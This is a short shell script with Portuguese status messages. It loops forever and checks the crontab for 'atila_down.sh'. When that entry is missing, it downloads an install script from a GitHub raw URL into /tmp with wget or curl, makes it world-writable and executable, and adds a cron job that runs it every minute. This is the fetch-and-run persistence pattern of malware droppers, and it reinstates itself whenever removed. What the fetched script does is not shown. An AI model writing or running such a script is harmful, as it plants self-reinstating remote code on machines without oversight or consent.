


install_url='https://github.com/atilabyte/golang/raw/refs/heads/master/scripts/install.sh'






while true ; do 



sleep 10



if crontab -l 2>/dev/null | grep -q "atila_down.sh"; then


    echo "cron ok"



else

    echo "atila nao esta no crontab"
     
     

 wget  $install_url  -O  /tmp/atila_down.sh ||  curl  -L  $install_url   -o /tmp/atila_down.sh
  
  
cd /tmp ; chmod 777 atila_down.sh
  
 
(crontab -l ;   echo   "* * * * * /tmp/atila_down.sh") | crontab -

    
    

fi


done



